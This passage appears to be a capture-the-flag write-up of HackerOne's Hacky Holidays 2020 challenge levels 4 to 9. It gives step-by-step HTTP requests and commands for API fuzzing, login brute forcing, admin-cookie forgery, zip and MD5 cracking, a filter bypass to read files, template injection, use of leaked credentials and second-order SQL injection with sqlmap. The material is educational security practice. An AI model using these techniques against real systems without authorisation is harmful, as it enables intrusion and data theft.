13Referer: https://hackyholidays.h1ctf.com/swag-shop
14Accept-Encoding: gzip, deflate
15Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
16
17id=3
Response
Code 195 Bytes
1HTTP/1.1 401 Unauthorized
2Server: nginx/1.18.0 (Ubuntu)
3Date: Thu, 31 Dec 2020 04:10:41 GMT
4Content-Type: application/json
5Connection: close
6Content-Length: 33
7
8{"error": "You are not logged in"}
At first, I did the brute force on https://hackyholidays.h1ctf.com/swag-shop/api/login login area with a different wordlist. But I failed.
<image_7>
As every request triggered after /api endpoint, so I did the brute force the /api path using the best wordlist which I came across with:
https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d which was created by Yassine Aboukir.
I used the tool "FFUF" to fuzz the API endpoint with responses such as 200,400,403,401,502.
Command - ./ffuf -w word.txt -u "https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ" -mc 200,400,403,401,502
<image_8>
In the response I got:
Code 137 Bytes
1sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
2user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
Afterwards, I visited https://hackyholidays.h1ctf.com/swag-shop/api/sessions :
Response
<image_9>
Code 2.15 KiB
1{
2"sessions": [
3"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
4"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
5"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
6"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
7"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
8"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
9"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
10"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
11]
12}
I decoded every base64 encrypted session and it turns out on 3rd session was revealing some information:
Code 574 Bytes
13rd session - 
2
3eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
4
5base64 decoded - 
6
7{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
From here, I got user-id as C7DCCE-0E0DAB-B20226-FC92EA-1B9043 and cookie value.
Next, I visited https://hackyholidays.h1ctf.com/swag-shop/api/user and response was:
<image_10>
It says "missing required field" and I thought as I got the user id as C7DCCE-0E0DAB-B20226-FC92EA-1B9043, thus we have to add here with some parameter on this API endpoint.
I tried with user_id, userid and then I thought as it's encrypted, Let's try with uuid and it worked.
Request
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
Response
<image_11>
Code 234 Bytes
1{
2"uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3"username": "grinch",
4"address": {
5"line_1": "The Grinch",
6"line_2": "The Cave",
7"line_3": "Mount Crumpit",
8"line_4": "Whoville"
9},
10"flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
11}
In this way, I got the 4th flag in the response.
Flag 4 - flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
Day 5 - CTF level 5
On day 5, there was a new link for ctf level which is https://hackyholidays.h1ctf.com/secure-login.
To test the login page functionality, I've added some random username such as hello to check the output.
<image_12>
It responded with an invalid username error. As per the logic of the application, if we get the correct username, then the next error definitely will be an "invalid password". So, it was a case of login brute force.
I've used Seclist wordlist for usernames. Reference - https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt
To brute force, I've used the OWASP ZAP tool on this request:
Code 542 Bytes
1POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
2User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
3Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4Accept-Language: en-US,en;q=0.5
5Content-Type: application/x-www-form-urlencoded
6Content-Length: 30
7Origin: https://hackyholidays.h1ctf.com
8Connection: keep-alive
9Referer: https://hackyholidays.h1ctf.com/secure-login
10Upgrade-Insecure-Requests: 1
11Host: hackyholidays.h1ctf.com
12
13username=admin&password=admin
<image_13>
However, there was one problem, while brute-forcing on the OWASP ZAP tool, the size, and the response was the same, thus I was checking each request one by one to check the different output. Luckily, on the username as "access", I got a response as "Invalid Password".
Request
Code 543 Bytes
1POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
2User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
3Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4Accept-Language: en-US,en;q=0.5
5Content-Type: application/x-www-form-urlencoded
6Content-Length: 30
7Origin: https://hackyholidays.h1ctf.com
8Connection: keep-alive
9Referer: https://hackyholidays.h1ctf.com/secure-login
10Upgrade-Insecure-Requests: 1
11Host: hackyholidays.h1ctf.com
12
13username=access&password=admin
<image_14>
<image_15>
In the above screenshot, we can see the response as "Invalid Password".
So, the username is "access" and next up to find the valid password.
For brute-forcing, I've used another seclist wordlist for a password. Reference - https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-100.txt.
Luckily, while brute-forcing the password, I got the response as 302 on the password as "computer".
Request
Code 546 Bytes
1POST https://hackyholidays.h1ctf.com/secure-login HTTP/1.1
2User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
3Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4Accept-Language: en-US,en;q=0.5
5Content-Type: application/x-www-form-urlencoded
6Content-Length: 33
7Origin: https://hackyholidays.h1ctf.com
8Connection: keep-alive
9Referer: https://hackyholidays.h1ctf.com/secure-login
10Upgrade-Insecure-Requests: 1
11Host: hackyholidays.h1ctf.com
12
13username=access&password=computer
<image_16>
Response
Code 350 Bytes
1HTTP/1.1 302 Found
2Server: nginx/1.18.0 (Ubuntu)
3Date: Thu, 31 Dec 2020 10:33:46 GMT
4Content-Type: text/html; charset=UTF-8
5Connection: keep-alive
6Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; expires=Thu, 31-Dec-2020 11:33:46 GMT; Max-Age=3600; path=/secure-login
7Location: /secure-login
<image_17>
As I got the username as "access" and password as "computer", I've authenticated directly using chrome browser. After logging in, it responded with "no files to download".
<image_18>
First thing I checked to use inspect the element and check if there is a disabled href link or not, however, no luck.
Next thing I saw there was a cookie parameter in the response which was base64 encrypted.
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=
Decoded the base64 parameter and cookie value was {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}. I changed the "admin":"false" to "admin":"true" and next thing, again encoded the cookie parameter.
Code 159 Bytes
1{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true} -> base64 encode -> eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
In my chrome browser, I already got the "edit this cookie" extension and I changed with the above newly base64 encoded cookie parameter.
<image_19>
After changing the cookie, I refreshed the page and thus, got the zip file download option as "my_secure_files_not_for_you.zip".
<image_20>
After downloading and when I open the file, it was password protected.
<image_21>
Afterwards, I installed one tool on the mac which is best for cracking the zip file - "Fcrackzip".
http://macappstore.org/fcrackzip/
For password wordlist, I got Seclist common 100k passwords - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt.
Run the command as fcrackzip -D -p /Users/kunalpandey/Desktop/pass.txt -u /Users/kunalpandey/Desktop/my_secure_files_not_for_you.zip
<image_22>
After bruteforcing, I got the result within one second which is "hahahaha" as password. Typed in the password on the zip file, extracted it successfully, and got another flag. There was also a grinch pic along with it.
<image_23>
Inside the flag.txt file, it was stored as flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004} and finally, ctf level 5 was over.
Flag 5 - flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}.
Day 6 - Flag 6
On day 6, the new CTF level was added as /my-diary inside /apps path on https://hackyholidays.h1ctf.com.
<image_24>
On visiting the page - https://hackyholidays.h1ctf.com/my-diary/?template=entries.html, it was with template path.
If the template path was accepting entries.html, thus it means there must be an index main file to get the output of the main application. So, the first thing I guessed with index.html, however, it redirected to entries.html. So, I was trying as index.jsp, index. aspx, and luckily on index.php, a new page got opened.
Request
https://hackyholidays.h1ctf.com/my-diary/?template=index.php
Response
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
Code analysis
While analyzing the above code, it looks like there was a regex check operation, so it means we're only allowed for the range "a-z, A-Z, and 0-9." and thus, no special characters.
On the code $page = str_replace("admin.php","",$page);, string "admin.php" was replaced with blank character "" .
On the code $page = str_replace("secretadmin.php","",$page);, string "secretadmin.php" was also replaced with blank character "".
In the comment section, the developer has specifically written the comment as "protect admin.php from being read" and then following up "I've changed the admin file to secretadmin.php for more security".
Thus, it means we need only the "secretadmin.php" path on the template parameter as "admin.php" was protected.
However, as the server was replacing "secretadmin.php" with a blank character, thus it was not fulfilling the condition and redirects to the default page as
"/my-diary/?template=entries.html".
In order to bypass it, it needed a regex bypass condition. In order to bypass the regex condition, I can't apply any special characters, however, I can still use the above string replace condition to bypass the condition which was a blank condition string check.
Regex Calculation
Code 534 Bytes
1admin.php = ""                     |   - replaced by blank character
2secretadmin.php = ""      | -  replaced by blank character
3
4secretadmin.php   ------->   add blank space ------>secretad''min.php   -------> replace ''with secretadmin.php -------> 
5secretadsecretadmin.phpmin.php -------> add blank space --------->   secretadsecretad''min.phpmin.php  ----------> 
6replace  '' with admin.php (to complicate more regex check) ----------> secretadsecretadadmin.phpmin.phpmin.php
7
8Final string - secretadsecretadadmin.phpmin.phpmin.php
In the regex calculation, we are adding blank space in between and thus replacing with admin.php or secretadmin.php so that condition will also be satisfied from the server and also we can bypass the regex check as well.
Finally, after complicating the string from secretadmin.php to secretadsecretadadmin.phpmin.phpmin.php, I've tried again on the template parameter and finally, got the flag.
Request
https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretadadmin.phpmin.phpmin.php
Response
<image_25>
Code 133 Bytes
1My Diary
2flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
3Pending Entries
4Date	Event	Action
523rd Dec	Launch DDoS Against Santa's Workshop!	
This level was more on the source code analysis rather than the recon part to bypass the regex check from the server.
Flag 6 - flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}.
Day 7 - CTF level 7
On day 7, a new ctf level has been introduced as "hate-mail generator" inside /apps on https://hackyholidays.h1ctf.com.
Visiting the workflow of the site gave me an idea about either it's about template injection.
<image_26>
<image_27>
<image_28>
Based on the observation, there were three template parameters used in this application.
Code 332 Bytes
1Template param 1 - {{template:cbdj3_grinch_header.html}} - Template parameter which was using the template page to load.
2Template param 2- {name} - The name parameter was fetching the name.
3Template param 3 - {email} - The email parameter was been used inside the new page on https://hackyholidays.h1ctf.com/hate-mail-generator/new.
First, I visited the https://hackyholidays.h1ctf.com/hate-mail-generator/new and created a new email as
<image_29>
For {{template:""}} parameter, I wanted to inject an arbitrary path to check the output first and so decided to give index.html inside the template param.
On name area - "hi" ,subject area - "attack" and on Markup area - "Hello {{name}} {{template:index.html}} {{email}}". After selecting the preview option and also intercepting the request:
Request
Code 938 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 172
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: https://hackyholidays.h1ctf.com
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?1
14Sec-Fetch-Dest: document
15Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
16Accept-Encoding: gzip, deflate
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18
19preview_markup=Hello+%7B%7Bname%7D%7D+%7B%7Btemplate%3Aindex.html%7D%7D+%7B%7Bemail%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D
Response
Code 206 Bytes
1HTTP/1.1 200 OK
2Server: nginx/1.18.0 (Ubuntu)
3Date: Thu, 31 Dec 2020 11:55:18 GMT
4Content-Type: text/html; charset=UTF-8
5Connection: close
6Content-Length: 47
7
8Cannot find template file /templates/index.html
In the response we got a response as "Cannot find template file /templates/index.html", which means there must be a path "templates" after "hate-mail-generator".
Without bruteforcing and checking directly - https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and got the directory preview with html files
Request
https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
Response
<image_30>
Code 342 Bytes
1Index of /hate-mail-generator/templates/
2
3../
4cbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -
5cbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -
638dhs_admins_only_header.html                                21-Apr-2020 15:29                  46
So I looked at it and saw this file "38dhs_admins_only_header.html" as it was interesting, however visiting the page directly gave 403 error.
Request
https://hackyholidays.h1ctf.com/hate-mail-generator/templates/38dhs_admins_only_header.html
Response
<image_31>
I know this was not going to be easy, so the next idea that came to my mind is to directly insert "38dhs_admins_only_header.html " inside the template parameter on the "preview_markup".
Request
Code 900 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 134
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: https://hackyholidays.h1ctf.com
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?1
14Sec-Fetch-Dest: document
15Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
16Accept-Encoding: gzip, deflate
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18
19preview_markup=Hello{{name}}{{template:38dhs_admins_only_header.html}}{{email}}&preview_data={"name":"Alice","email":"alice@test.com"}
Response
Code 224 Bytes
1
2HTTP/1.1 200 OK
3Server: nginx/1.18.0 (Ubuntu)
4Date: Thu, 31 Dec 2020 12:23:44 GMT
5Content-Type: text/html; charset=UTF-8
6Connection: close
7Content-Length: 64
8
9You do not have access to the file 38dhs_admins_only_header.html
I was like hmm, this also failed as it says about access error.
So, another method which can be handy in this type of situation will be reference based exploit. In reference based exploit, we can insert the file "38dhs_admins_only_header.html" inside email parameter on preview_data parameter and just call {{email}} on preview_markup directly to check what will be the output and thus, it was exploited successfully.
Request
Code 872 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 106
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: https://hackyholidays.h1ctf.com
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?1
14Sec-Fetch-Dest: document
15Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
16Accept-Encoding: gzip, deflate
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18
19preview_markup={{email}}&preview_data={"name":"aaaa","email":"{{template:38dhs_admins_only_header.html}}"}
Response
Code 499 Bytes
1HTTP/1.1 200 OK
2Server: nginx/1.18.0 (Ubuntu)
3Date: Thu, 31 Dec 2020 12:28:45 GMT
4Content-Type: text/html; charset=UTF-8
5Connection: close
6Content-Length: 339
7
8<html>
9<body>
10<center>
11    <table width="700">
12        <tr>
13            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
14        </tr>
15        <tr>
16            <td style="padding:20px 10px 20px 10px">
17                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
So, in this way, reference parameter bypassed the file condition check due to reference based parameter exploit and got the response from server which there was an hidden flag inside.
Flag 7 - flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Day 8 - CTF level 8
On day 8, there was new level as https://hackyholidays.h1ctf.com/forum on /apps.
Visiting the page directly gave me an idea of the workflow.
<image_32>
This is an forum area where there are different posts and we need to login to get the access inside.
Looking at the posts we can see that there are two users - grinch and max and there is an option to login -
https://hackyholidays.h1ctf.com/forum/login.
<image_33>
So, first thing I tried to bruteforce passwords area with both username as grinch and max but no luck at all on login area. I was trying to analyze more and more and inspect the element but couldn't find anything.
I know the CTF master is "adamtlangley". So, I tried to search his github repo to see if I find anything as intentionally or unintentionally there can be source code leakage, at this point it was all guess.
Thus, I search it on google as "site:github.com adamtlangley" and got the link as "https://github.com/adamtlangley".
<image_34>
In the contribution activity, I saw
Code 44 Bytes
1December 2020
2Grinch-Networks/forum 1 commit
So, I visited the page https://github.com/Grinch-Networks/forum and started the code review one by one on every files. I wanted to see if there are an username and password leaked or not.
Analyzed every files, however couln't find anything interesting. Next up, I started to look at commits area - "https://github.com/Grinch-Networks/forum/commits/main", and thus on the second commit as "small fix", it was leaking the username and password for the database.
Request
https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
Response
Code 630 Bytes
1
2 */
3    static public function read(){
4        if( gettype(self::$read) == 'string' ) {
5            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
6            self::$read = new DbConnect( false, '', '','' );
7        }
8        return self::$read;
9    }
10@@ -146,7 +146,7 @@ public static function closeAll(){
11     */
12    static public function write(){
13        if( gettype(self::$write) == 'string' ) {
14            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
15            self::$write = new DbConnect( true,  '', '','' );
16        }
17        return self::$write;
18    }
In self::$write = new DbConnect( true, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );, we can see username and password.
username - forum, password - 6HgeAZ0qC9T6CQIqJpD.
Next up , as we got the database username and password, first I try to logged into /forum/login, but it was incorrect, next up idea was to bruteforce.
In bruteforce, I've used the wordlist as - https://github.com/danielmiessler/SecLists/blob/d5271820d00935387bdff87d0a79ae5513b47ce3/Discovery/Web-Content/api/objects.txt.
Executed the command using ffuf tool - ./ffuf -w /Users/kunalpandey/Desktop/objects.txt -u "https://hackyholidays.h1ctf.com/forum/FUZZ"
<image_35>
Response
Code 291 Bytes
12                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
21                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
3login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
4phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
So, there is an /forum/phpmyadmin path. I've used the username - forum, password - 6HgeAZ0qC9T6CQIqJpD inside phpmyadmin page and logged in successfully, I searched for the tables and finally in the table users, I got the following information:
Request
https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user
Response
<image_36>
Code 110 Bytes
1id	username	password	admin
21	grinch	35D652126CA1706B59DB02C93E0C9FBF	1
32	max	388E015BC43980947FCE0E5DB16481D1	
In the column "admin", it was 1 for username grinch and thus we can say that grinch is an admin. However , password was encrypted. Now, to crack the password, one of the best site can be used over here is https://crackstation.net.
In this site, entered the encrypted hash as 35D652126CA1706B59DB02C93E0C9FBF.
<image_37>
Within one second, got the cracked hash as
Code 63 Bytes
1Hash	Type	Result
235D652126CA1706B59DB02C93E0C9FBF	md5	BahHumbug
So, for username - grinch, password is BahHumbug. Using this credentials, logged in successfully on the page https://hackyholidays.h1ctf.com/forum/login and visited the secret plans forum page.
Request
https://hackyholidays.h1ctf.com/forum/3/2
Response
<image_38>
Code 229 Bytes
1We've launched our recon server, gathered intelligence and pin pointed Santa's location!
2Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!
3
4flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
In this way, got the flag which was hidden inside secret forum page after logging in.
Flag 8 - flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}.
Day 9 - CTF level 9
On day 9, The ctf level launched as "Evil quiz" inside /apps.
Visited the page https://hackyholidays.h1ctf.com/evil-quiz and got the workflow as : On page https://hackyholidays.h1ctf.com/evil-quiz, we can provide any name, after submitting the name, it'll navigate to https://hackyholidays.h1ctf.com/evil-quiz/start and thus, on page https://hackyholidays.h1ctf.com/evil-quiz/score, it'll reflect the score.
<image_39>
There was also an admin area inside evil-quiz which was for logged in.
https://hackyholidays.h1ctf.com/evil-quiz/admin
<image_40>
At this point, I thought to not try bruteforce at all and there will be different method this time. So, on previous ctf levels , it was recon, bruteforce , source -code review and api endpoint exploit. Maybe, this time there might be a case for sql injection.
So, tried common payloads using https://github.com/payloadbox/sql-injection-payload-list on name
Code 807 Bytes
1http
2POST /evil-quiz HTTP/1.1
3Host: hackyholidays.h1ctf.com
4Connection: close
5Content-Length: 24
6Cache-Control: max-age=0
7Upgrade-Insecure-Requests: 1
8Origin: https://hackyholidays.h1ctf.com
9Content-Type: application/x-www-form-urlencoded
10User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
12Sec-Fetch-Site: same-origin
13Sec-Fetch-Mode: navigate
14Sec-Fetch-User: ?1
15Sec-Fetch-Dest: document
16Referer: https://hackyholidays.h1ctf.com/evil-quiz
17Accept-Encoding: gzip, deflate
18Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
19Cookie: session=7ef26002a6768edc128fa085f2097475
20
21name=%22+or+sleep%285%29
Tried payload as " or sleep(5) on name area.
<image_41>
After injecting, submitting the request on quiz area
Code 816 Bytes
1POST /evil-quiz/start HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 26
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: https://hackyholidays.h1ctf.com
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?1
14Sec-Fetch-Dest: document
15Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
16Accept-Encoding: gzip, deflate
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18Cookie: session=7ef26002a6768edc128fa085f2097475
19
20ques_1=0&ques_2=0&ques_3=0
Response
Code 186 Bytes
1HTTP/1.1 302 Found
2Server: nginx/1.18.0 (Ubuntu)
3Date: Thu, 31 Dec 2020 13:42:56 GMT
4Content-Type: text/html; charset=UTF-8
5Connection: close
6Location: /evil-quiz/score
7Content-Length: 0
and then redirected to /evil-quiz/score which was loaded after 5 seconds, that means it was vulnerable to sql injection. This sql injection was of second order because of name was injected on one post request address and output was reflecting on different address /evil-quiz/score.
In order to exploit even better, I've used tool as sqlmap.
Command - python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score"
where exploit.txt was defined as
Code 802 Bytes
1POST /evil-quiz HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 24
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: https://hackyholidays.h1ctf.com
8Content-Type: application/x-www-form-urlencoded
